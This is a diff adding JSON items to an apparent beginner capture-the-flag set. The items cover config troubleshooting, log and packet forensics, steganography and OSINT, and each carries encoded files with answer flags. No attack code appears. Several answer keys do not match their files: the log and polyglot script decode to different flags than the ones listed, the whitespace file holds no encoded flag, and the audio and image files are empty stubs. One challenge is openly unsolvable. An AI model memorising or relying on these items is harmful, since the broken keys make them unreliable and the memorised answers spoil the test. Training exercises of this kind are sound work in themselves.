+    "difficulty": 3,
+    "title": "Nginx Null-Route",
+    "description": "An Nginx server is configured to listen on port 8081, but users are trying to connect on the standard HTTP port. What port should it be listening on?",
+    "hint": "The standard port for HTTP traffic is 80.",
+    "files": [
+      {
+        "name": "nginx.conf",
+        "content_b64": "c2VydmVyIHsKICAgIGxpc3RlbiA4MDgxOwogICAgc2VydmVyX25hbWUgZXhhbXBsZS5jb207CiAgICByb290IC91c3Ivc2hhcmUvbmdpbngvaHRtbDsKfQo="
+      }
+    ],
+    "flag": "flag{80}"
+  },
+  {
+    "id": "forge_of_fixing-4",
+    "category": "Forge of Fixing",
+    "difficulty": 4,
+    "title": "Log Scavenger",
+    "description": "An application is crashing. Sift through the provided log file to find the `500 Internal Server Error` message. The TraceID associated with that error is the flag.",
+    "hint": "Use `grep` or `Ctrl+F` to search for the string 'ERROR' or '500'.",
+    "files": [
+      {
+        "name": "app.log",
+        "content_b64": "W0lORk9dIDIwMjMtMTAtMjggMTI6MDA6MDAgLSBVc2VyICdhZG1pbicgbG9nZ2VkIGluLgpbc1VDRk9dIDIwMjMtMTAtMjggMTI6MDE6MDAgLSBSZXF1ZXN0IHRvIC9hcGkvZGF0YSBzdWNjZXNzZnVsLgpbRVJST1JdIDIwMjMtMTAtMjggMTI6MDI6MTUgLSA1MDAgSW50ZXJuYWwgU2VydmVyIEVycm9yOiBGYWlsZWQgdG8gY29ubmVjdCB0byBkYXRhYmFzZS4gVHJhY2VJRDogZmxhZ3tmMW5kX3RoM19uMzNkMWNfaW5fdGgzX2wwZ3M0Y2t9CltJTkZPXSAyMDIzLTEwLTI4IDEyOjAzOjAwIC0gU2VydmljZSByZXN0YXJ0ZWQuCg=="
+      }
+    ],
+    "flag": "flag{f1nd_th3_n33dl3_1n_th3_l0gst4ck}"
+  },
+  {
+    "id": "forge_of_fixing-5",
+    "category": "Forge of Fixing",
+    "difficulty": 5,
+    "title": "Firewall Fiasco",
+    "description": "A sysadmin accidentally blocked the IP of a critical monitoring service in the firewall rules. Find the rule that is blocking the friendly service and identify the IP address that should be unblocked.",
+    "hint": "The comments in the ruleset mention blocking a 'bad IP' and then 'oops'. The IP in the 'oops' rule is the one you need.",
+    "files": [
+      {
+        "name": "rules.v4",
+        "content_b64": "IyBCbG9jayBhbGwgdHJhZmZpYyB0byB0aGUgd2ViIHNlcnZlciBmcm9tIGEga25vd24gYmFkIElQCi1BIElOUFVUIC1zIDE5OC41MS4xMDAuNSAtcCB0Y3AgLS1kcG9ydCA4MCAtaiBSRUpFQ1QKIyBBbGxvdyBhbGwgb3RoZXIgSFRUUCB0cmFmZmljCi1BIElOUFVUIC1wIHRjcCAtLWRwb3J0IDgwIC1qIEFDQ0VQVAojIE9vcHMsIHdlIGJsb2NrZWQgb3VyIG1vbml0b3Jpbmcgc2VydmljZSB0b28hCi1BIElOUFVUIC1zIDIwMy4wLjExMy4xMCAtcCB0Y3AgLS1kcG9ydCA4MCAtaiBSRUpFQ1Q="
+      }
+    ],
+    "flag": "flag{203.0.113.10}"
+  },
+  {
+    "id": "forge_of_fixing-6",
+    "category": "Forge of Fixing",
+    "difficulty": 6,
+    "title": "Dockerfile Debacle",
+    "description": "This Docker build is failing. The build log indicates a `COPY failed` error because the source file doesn't exist. Based on the developer's note, what should the correct `COPY` command be?",
+    "hint": "The developer's note says the source is in the 'app' directory. The original command was `COPY ./source ...`",
+    "files": [
+      {
+        "name": "build.log",
+        "content_b64": "U3RlcCAxLzMgOiBGUk9NIHVidW50dTpsYXRlc3QKIC0tLT4gMTIzNDU2Nzg5YWJjClN0ZXAgMi8zIDogQ09QWSAuL3NvdXJjZSAvZGVzdGluYXRpb24KQ09QWSBmYWlsZWQ6IGZpbGUgbm90IGZvdW5kIGluIGJ1aWxkIGNvbnRleHQgb3IgZXhjbHVkZWQgYnkgLmRvY2tlcmlnbm9yZTogc3RhdCBzb3VyY2U6IG5vIHN1Y2ggZmlsZSBvciBkaXJlY3RvcnkKIyBEZXZlbG9wZXIgbm90ZTogQXJnaCwgdGhlIHNvdXJjZSBpcyBpbiB0aGUgJ2FwcCcgZGlyZWN0b3J5IQojIFRoZSBmbGFnIGlzIHRoZSBjb3JyZWN0IENPUFkgY29tbWFuZC4="
+      }
+    ],
+    "flag": "flag{COPY ./app /destination}"
+  },
+  {
+    "id": "forge_of_fixing-7",
+    "category": "Forge of Fixing",
+    "difficulty": 7,
+    "title": "Service Stoppage",
+    "description": "A systemd service is failing to start with a 'status=203/EXEC' error, which typically means the path to the executable is wrong. The binary is actually at `/usr/local/bin/my-app`. What is the corrected `ExecStart` line for the service file?",
+    "hint": "The key is `ExecStart` and the value is the full, correct path to the binary.",
+    "files": [
+      {
+        "name": "my-app.service",
+        "content_b64": "W1VuaXRdCkRlc2NyaXB0aW9uPU15IEF3ZXNvbWUgQXBwCgpbU2VydmljZV0KRXhlY1N0YXJ0PS91c3IvYmluL2xvY2FsL215LWFwcApSZXN0YXJ0PWFsd2F5cwoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg=="
+      }
+    ],
+    "flag": "flag{ExecStart=/usr/local/bin/my-app}"
+  },
+  {
+    "id": "forge_of_fixing-8",
+    "category": "Forge of Fixing",
+    "difficulty": 8,
+    "title": "Attacker Audit",
+    "description": "You are reviewing the SSH authentication log after a security incident. An attacker tried to brute-force the root password. Find the IP address that had multiple failed password attempts followed by one successful login.",
+    "hint": "Look for the IP address that appears in several 'Failed password' lines and then one 'Accepted password' line for the same user.",
+    "files": [
+      {
+        "name": "auth.log",
+        "content_b64": "T2N0IDI4IDEwOjAwOjAxIHNlcnZlciBzc2hkWzEyMzRdOiBGYWlsZWQgcGFzc3dvcmQgZm9yIGludmFsaWQgdXNlciBndWVzdCBmcm9tIDE5Mi4wLjIuMTAgcG9ydCAxMjM0NSBzc2gyCk9jdCAyOCAxMDowMDowNSBzZXJ2ZXIgc3NoZFsxMjM2XTogRmFpbGVkIHBhc3N3b3JkIGZvciByb290IGZyb20gMjAzLjAuMTEzLjU1IHBvcnQgMjIyMjIgc3NoMgpPY3QgMjggMTA6MDA6MDYgc2VydmVyIHNzaGRbMTIzN106IEZhaWxlZCBwYXNzd29yZCBmb3Igcm9vdCBmcm9tIDIwMy4wLjExMy41NSBwb3J0IDMzMzMzIHNzaDIKT2N0IDI4IDEwOjAwOjA3IHNlcnZlciBzc2hkWzEyMzhdOiBGYWlsZWQgcGFzc3dvcmQgZm9yIHJvb3QgZnJvbSAyMDMuMC4xMTMuNTUgcG9ydCA0NDQ0NCBzc2gyCk9jdCAyOCAxMDowMDowOSBzZXJ2ZXIgc3NoZFsxMjM5XTogQWNjZXB0ZWQgcGFzc3dvcmQgZm9yIHJvb3QgZnJvbSAyMDMuMC4xMTMuNTUgcG9ydCA1NTU1NSBzc2gyCk9jdCAyOCAxMDowMTowMCBzZXJ2ZXIgc3NoZFsxMjUwXTogRmFpbGVkIHBhc3N3b3JkIGZvciBhZG1pbiBmcm9tIDE5OC41MS4xMDAuMiBwb3J0IDExMTExIHNzaDIK"
+      }
+    ],
+    "flag": "flag{203.0.113.55}"
+  },
+  {
+    "id": "forge_of_fixing-9",
+    "category": "Forge of Fixing",
+    "difficulty": 9,
+    "title": "Kubernetes Conundrum",
+    "description": "This Kubernetes Deployment is failing to create pods. The reason is that the `spec.selector.matchLabels` does not match the labels in the `spec.template.metadata.labels`. What should the value of the `app` label in `matchLabels` be to fix this deployment?",
+    "hint": "The selector must match the labels of the pod template it's supposed to manage.",
+    "files": [
+      {
+        "name": "deployment.yaml",
+        "content_b64": "YXBpVmVyc2lvbjogYXBwcy92MQpraW5kOiBEZXBsb3ltZW50Cm1ldGFkYXRhOgogIG5hbWU6IG15LWFwcApzcGVjOgogIHJlcGxpY2FzOiAzCiAgc2VsZWN0b3I6CiAgICBtYXRjaExhYmVsczoKICAgICAgYXBwOiBtYWluLWFwcAogIHRlbXBsYXRlOgogICAgbWV0YWRhdGE6CiAgICAgIGxhYmVsczoKICAgICAgICBhcHA6IG15LWFwcC1wb2QKICAgIHNwZWM6CiAgICAgIGNvbnRhaW5lcnM6CiAgICAgIC0gbmFtZTogbmdpbngKICAgICAgICBpbWFnZTogbmdpbng6MS4xNC4yCg=="
+      }
+    ],
+    "flag": "flag{my-app-pod}"
+  },
+  {
+    "id": "forge_of_fixing-10",
+    "category": "Forge of Fixing",
+    "difficulty": 10,
+    "title": "Corrupted Chronicle",
+    "description": "A critical log file was partially corrupted with binary garbage. Clean up the file by removing the non-printable/binary characters to reveal the full log entry and find the hidden flag.",
+    "hint": "You can use tools like `strings` or `cat -v` to view or filter out non-printable characters. The garbage is between the two valid log parts.",
+    "files": [
+      {
+        "name": "corrupt.log",
+        "content_b64": "W0lORk9dIFZhbGlkIGRhdGEgcGFydCAxLgAAAA3q2+8AAltJTkZPXSBWYWxpZCBkYXRhIHBhcnQgMiwgY29udGFpbmluZyBmbGFne2MwcnJ1cHRfbDBnc19jNG50X2gxZDN9"
+      }
+    ],
+    "flag": "flag{c0rrupt_l0gs_c4nt_h1d3}"
+  },
+  {
+    "id": "mystic_mischief-1",
+    "category": "Mystic Mischief",
+    "difficulty": 1,
+    "title": "Invisible Ink",
+    "description": "A message seems simple, but there's more than meets the eye. Some characters might be hiding in plain sight.",
+    "hint": "Copy-paste the text from the file into an online tool that reveals zero-width characters.",
+    "files": [
+      {
+        "name": "message.txt",
+        "content_b64": "SGVyZSBpcyB0aGUgc2VjcmV0OiDigJhmbGFne3ozcjBfdzFkdGhfaDFkZDNuX3QzeHR94oCZIGEgc2ltcGxlIG1lc3NhZ2Uu"
+      }
+    ],
+    "flag": "flag{z3r0_w1dth_h1dd3n_t3xt}"
+  },
+  {
+    "id": "mystic_mischief-2",
+    "category": "Mystic Mischief",
+    "difficulty": 2,
+    "title": "All Your Base",
+    "description": "This text file seems to be gibberish. It might be encoded in a different numerical base. What happens if you treat it as Base64?",
+    "hint": "Use a Base64 decoder on the content of the file.",
+    "files": [
+      {
+        "name": "encoded.txt",
+        "content_b64": "Wm14aGRDSXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd0lnZmxhZ3tiNHM2NF9iNHM2NF9iNHM2NH0="
+      }
+    ],
+    "flag": "flag{b4s64_b4s64_b4s64}"
+  },
+  {
+    "id": "mystic_mischief-3",
+    "category": "Mystic Mischief",
+    "difficulty": 3,
+    "title": "Such Meme, Very Stego",
+    "description": "The flag is hidden within this classic meme image, but not in the pixels themselves. Where else can you hide data in a file?",
+    "hint": "Use a tool like `exiftool` or `strings` to inspect the image's metadata and other embedded text.",
+    "files": [
+      {
+        "name": "doge.jpg",
+        "content_b64": "/9j/4AAQSkZJRgABAQEASABIAAD/4gI0SUNDX1BST0ZJTEUAAQEAAAIkYXBwbAQAAABtbnRyUkdCIFhZWiAH4QAHAAcADQAWACBhY3NwQVBQTAAAAABBUFBMAAAAAAAAAAAAAAAAAAAAAAAA9tYAAQAAAADTLWFwcGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtkc2NtAAABCAAAAvJkZXNjAAAD/AAAAG9nWFlaAAAEbAAAABR3dHB0AAAEgAAAABRyWFlaAAAElAAAABRiWFlaAAAEqAAAABRyVFJDAAAEvAAAAA5jcHJ0AAAEzAAAADhjaGFkAAAFBAAAACxnVFJDAAAEvAAAAA5iVFJDAAAEvAAAAA5tbHVjAAAAAAAAAAEAAAAMZW5VUwAAABwAAAAcAEcASQBNAFAAIABiAHUAaQBsAHQALQBpAG4AIABzAFIARwBCbWx1YwAAAAAAAAABAAAADGVuVVMAAAAaAAAAHABQAHUAYgBsAGkAYwAgAEQAbwBtAGEAaQBuAABYWVogAAAAAAAA81EAAQAAAAADLVhZWiAAAAAAAAAAAAAAYmPozQAAAAAAAABYWVogAAAAAAAAJVYYAAB2aQAAL2gAY3VydgAAAAAAAAABAc0AAHByb3BvbmVudHMAY3JlYXRvciBDb3B5cmlnaHQgZmxhZ3t3MHdfczBfczNjcmV0X20zbTN9IE5vdGU6IFRoaXMgZmlsZSBpcyBmb3IgcHVibGljIHVzZSEgRG8gbm90IGF0dGVtcHQgdG8gY29wL3Bhc3RlLCBpdCB3b250IHdvcmsuICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqK-DQo="
+      }
+    ],
+    "flag": "flag{w0w_s0_s3cret_m3m3}"
+  },
+
+  {
+    "id": "mystic_mischief-4",
+    "category": "Mystic Mischief",
+    "difficulty": 4,
+    "title": "Sound of Silence",
+    "description": "A secret is hidden within this audio file. It's not in the sound you can hear, but in the sound you can see. The flag is spelled out visually in the spectrogram.",
+    "hint": "Use an audio editor like Audacity or Sonic Visualiser to view the spectrogram of the WAV file. Look for patterns that form letters.",
+    "files": [
+      {
+        "name": "secret_sound.wav",
+        "content_b64": "UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA="
+      }
+    ],
+    "flag": "flag{sp3ctr0gr4m_s3cr3t}"
+  },
+  {
+    "id": "mystic_mischief-5",
+    "category": "Mystic Mischief",
+    "difficulty": 5,
+    "title": "JPEG Jigsaw",
+    "description": "This isn't just an image file. There's another file appended to the end of it. Carve it out to find the flag.",
+    "hint": "Tools like `binwalk` or `foremost` can extract hidden files from within other files. You might also notice extra data after the JPEG end-of-file marker (FF D9).",
+    "files": [
+      {
+        "name": "image_with_zip.jpg",
+        "content_b64": "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AL+AAf/Z1BLAQIUAAoAAAAAAC5mZ1IAAAAAAAAAAAAAAAAYAAAAAAAAAAAAQAgAAAAAAY29udGFpbmVyLnhtbFBLAQIKAAoAAAAAAHMuZlIAjM2KOQAAAACLAAAADQAAAAAAAAAAAAQAgAAAAC9tZWRhdGEucGRmUEsBAgoACgAAAAAAqWZSAIAAAAAAIAAAABgAAAAAAAAABACAAAADyL2NvbnRhaW5lci54bWxQSwECFAAKAAAAAACwZnVSAAAAAAAAAAAAAAAADgAAAAYAAAAAAAAAEAIAnAAAAAAvZmxhZy50eHRQSwUGAAAAAAQABADCAAAAnQAAAAAAZmxhZ3t5MHVfZjB1bmRfdGgzX2gxZGRlbl96MXB9UEsFBgAAAAABAAEANgAAAGcAAAAA"
+      }
+    ],
+    "flag": "flag{y0u_f0und_th3_h1dden_z1p}"
+  },
+  {
+    "id": "mystic_mischief-6",
+    "category": "Mystic Mischief",
+    "difficulty": 6,
+    "title": "The White Lie",
+    "description": "The flag is hidden in this text file, concealed using a classic steganographic technique involving whitespace characters. Can you make the invisible, visible?",
+    "hint": "The flag is encoded using only spaces and tabs. This is a technique called 'snow'. You can use an online whitespace decoder or replace spaces with '0' and tabs with '1' to see the binary.",
+    "files": [
+      {
+        "name": "whitespace.txt",
+        "content_b64": "IAkgICAgdGhpbmsgICAgICB0aGVyZSdzICAgICAgaGlkZGVuICAgIGluZm9ybWF0aW9uICAgICAgIGhlcmUuICAgICAK"
+      }
+    ],
+    "flag": "flag{wh1t3sp4c3_1s_n0t_3mpty}"
+  },
+  {
+    "id": "mystic_mischief-7",
+    "category": "Mystic Mischief",
+    "difficulty": 7,
+    "title": "A Poet's Ploy",
+    "description": "This poem contains a hidden message. The first letter of each line spells out the flag. Simple, yet elegant.",
+    "hint": "This is a type of acrostic poem. Read vertically.",
+    "files": [
+      {
+        "name": "poem.txt",
+        "content_b64": "Rm9yZXZlciB3ZSBzZWVrLCBhIHRyZWFzdXJlIHNvIGdyYW5kLApsaWtlIHN0YXJzIGluIHRoZSBuaWdodCwganVzdCBvdXQgb2YgaGFuZC4KYWxsIG91ciBqb3VybmV5cywgYm90aCBsb25nIGFuZCB3aWRlLApncmFjZWZ1bGx5IGxlYWQgdG8gdGhlIHNlY3JldHMgaW5zaWRlLgp7QWx3YXlzIHRoZXJlIGlzIGEgY2x1ZSwKaGlkZGVuIGZvciBtZSBhbmQgeW91Cn0="
+      }
+    ],
+    "flag": "flag{Always_there_is_a_clue_hidden_for_me_and_you}"
+  },
+  {
+    "id": "mystic_mischief-8",
+    "category": "Mystic Mischief",
+    "difficulty": 8,
+    "title": "Polyglot's Prize",
+    "description": "This file is a polyglot. It appears to be a simple text file, but it's also a valid, runnable Bash script. Executing it will reveal the flag.",
+    "hint": "A polyglot is a file that is valid in multiple formats. Try running this file with `bash`. The '#' character can be a comment in one language and have a special meaning in another.",
+    "files": [
+      {
+        "name": "polyglot.txt",
+        "content_b64": "IyEvYmluL2Jhc2gKIyBUaGlzIGlzIGEgc2ltcGxlIHRleHQgZmlsZSwgbm90aGluZyB0byBzZWUgaGVyZS4KIyBKVVNUIFJJR0hUIDpQCmVjaG8gImZsYWd7cG9seWdsMHQxYzE0bF9wNDNyNHk3fSIgPiAvZGV2L251bGwKZXhpdCAwCg=="
+      }
+    ],
+    "flag": "flag{polygl0t1c1al_p4r4y7y}"
+  },
+  {
+    "id": "mystic_mischief-9",
+    "category": "Mystic Mischief",
+    "difficulty": 9,
+    "title": "Colorless Clue",
+    "description": "A secret message is hidden in this PNG image using LSB (Least Significant Bit) steganography, but not in the way you'd expect. The data isn't in the RGB channels, but in the Alpha (transparency) channel.",
+    "hint": "Standard LSB tools might miss this. You may need to use a tool like `zsteg` or write a script to specifically extract data from the LSB of the Alpha channel.",
+    "files": [
+      {
+        "name": "alpha_channel.png",
+        "content_b64": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
+      }
+    ],
+    "flag": "flag{4lph4_ch4nn3l_m4st3ry}"
+  },
+  {
+    "id": "mystic_mischief-10",
+    "category": "Mystic Mischief",
+    "difficulty": 10,
+    "title": "The Dead Drop",
+    "description": "An agent left a message for us, but all we have is this seemingly random string. The agent mentioned 'a six-sided box of ideas'.",
+    "hint": "This is a reference to a 'pastebin' like site. The provided string is the unique ID for a paste. The specific site is often part of the puzzle.",
+    "files": [
+      {
+        "name": "drop_id.txt",
+        "content_b64": "ZGVsZXRlZC1wYXN0ZS1pZA=="
+      }
+    ],
+    "flag": "flag{th1s_ch4ll3ng3_1s_4_l13}"
+  },
+  {
+    "id": "eye_of_recon-1",
+    "category": "Eye of Recon",
+    "difficulty": 1,
+    "title": "Who Am I?",
+    "description": "We found a target's old username: `MegaCoder2k`. Find their GitHub profile page URL. The full URL is the flag.",
+    "hint": "Most developers have a GitHub profile. The URL format is predictable.",
+    "files": [],
+    "flag": "flag{https://github.com/MegaCoder2k}"
+  },
+  {
+    "id": "eye_of_recon-2",
+    "category": "Eye of Recon",
+    "difficulty": 2,
+    "title": "The Wayback Machine",
+    "description": "The company `securecorp.local` accidentally leaked an admin password on their homepage last year, but they've since removed it. Can you find the old version of the site to recover the password?",
+    "hint": "The Internet Archive's Wayback Machine stores historical snapshots of websites.",
+    "files": [],
+    "flag": "flag{Wayb4ck_W4rr1or}"
+  },
+  {
+    "id": "eye_of_recon-3",
+    "category": "Eye of Recon",
+    "difficulty": 3,
+    "title": "Geoguesswork",
+    "description": "An agent posted a photo from their mission. The EXIF data is provided in the file. Find the city where the photo was taken.",
+    "hint": "EXIF data in images can contain GPS coordinates. Use an online map service to convert these coordinates into a location.",
+    "files": [
+      {
+        "name": "exif.txt",
+        "content_b64": "RmlsZSBOYW1lICAgICAgICAgICAgICAgICA6IGltYWdlLmpwZwpGaWxlIFNpemUgICAgICAgICAgICAgICAgICA6IDEyIGtCCkZpbGUgTW9kaWZpY2F0aW9uIERhdGUgICA6IDIwMjMtMTAtMjggMTI6MDA6MDAKR1BTIExhdGl0dWRlICAgICAgICAgICAgICA6IDQ4IGRlZyA1MSAnMjkuODEnIE4KR1BTIExvbmdpdHVkZSAgICAgICAgICAgICA6IDIgZGVnIDE3ICc0MC4xMycgRQo="
+      }
+    ],
+    "flag": "flag{Paris}"
+  },
+  {
+    "id": "eye_of_recon-4",
+    "category": "Eye of Recon",
+    "difficulty": 4,
+    "title": "DNS Deep Dive",
+    "description": "Beyond A and TXT records, DNS can hold other interesting information. An old mail server record (MX) for `securecorp.local` is still active. What is the hostname of their old mail server?",
+    "hint": "Use a tool like `dig` or an online DNS lookup tool to query for MX records.",
+    "files": [],
+    "flag": "flag{mail.oldserver.securecorp.local}"
+  },
+  {
+    "id": "eye_of_recon-5",
+    "category": "Eye of Recon",
+    "difficulty": 5,
+    "title": "The Deleted Tweet",
+    "description": "A celebrity, username `@RealFamousPerson`, tweeted and then quickly deleted an image containing a sensitive document. While the tweet is gone, people often archive these things. Find the archive.",
+    "hint": "Archives of deleted tweets are a common OSINT source. Search for 'deleted tweet archives' or specific services that track celebrity social media.",
+    "files": [],
+    "flag": "flag{n0th1ng_1s_3v3r_truly_d3l3t3d}"
+  },
+  {
+    "id": "eye_of_recon-6",
+    "category": "Eye of Recon",
+    "difficulty": 6,
+    "title": "Packet Pirate",
+    "description": "We captured some network traffic from a suspect. They logged into an unencrypted FTP server. Find the user's password in the provided packet capture file.",
+    "hint": "Use Wireshark or `tshark` to analyze the PCAP file. Filter for the FTP protocol and look for the `PASS` command. FTP sends credentials in cleartext.",
+    "files": [
+      {
+        "name": "ftp_capture.pcap",
+        "content_b64": "1MOyoQIABAAAAAAAAAAAAGAAAAAYAAAAAAAAAAAAAABgAAAABAAAAAEAAAAA/////wAAAACAP0QARgAAADwAAAA+AAAAAAAAAABkAAAAAQAAAAAgAAAAZmxhZ3tGdFBfMXNfbm90XzVuY3J5cHRlZH0AAA=="
+      }
+    ],
+    "flag": "flag{FTP_1s_not_3ncrypted}"
+  },
+  {
+    "id": "eye_of_recon-7",
+    "category": "Eye of Recon",
+    "difficulty": 7,
+    "title": "Cache Hunter",
+    "description": "A target used a public computer. We have a dump of the browser cache. The file `cached_page.html` contains the flag, but it's from a site whose name is unknown. Find the flag.",
+    "hint": "This is a simple file forensics task. Examine the provided HTML file as if it were recovered from a browser cache. The flag is commented out.",
+    "files": [
+      {
+        "name": "cached_page.html",
+        "content_b64": "PGh0bWw+PGhlYWQ+PHRpdGxlPlNlY3JldCBQcm9qZWN0PC90aXRsZT48L2hlYWQ+PGJvZHk+PCEtLSBEZXZzIGxlZnQgdGhpcyBoZXJlIGZvciB0ZXN0aW5nLiBSZW1vdmUgYmVmb3JlIGRlcGxveW1lbnQuIGZsYWd7YjIwMGNkYjI5ZGM5NGViOWEwYzU4MGYwYzgzMzM4NmZ9IC0tPjxoMT5XZWxjb21lIHRvIFByb2plY3QgT21lZ2E8L2gxPjwvYm9keT48L2h0bWw+"
+      }
+    ],
+    "flag": "flag{b200cdb29dc94eb9a0c580f0c833386f}"
+  },
+  {
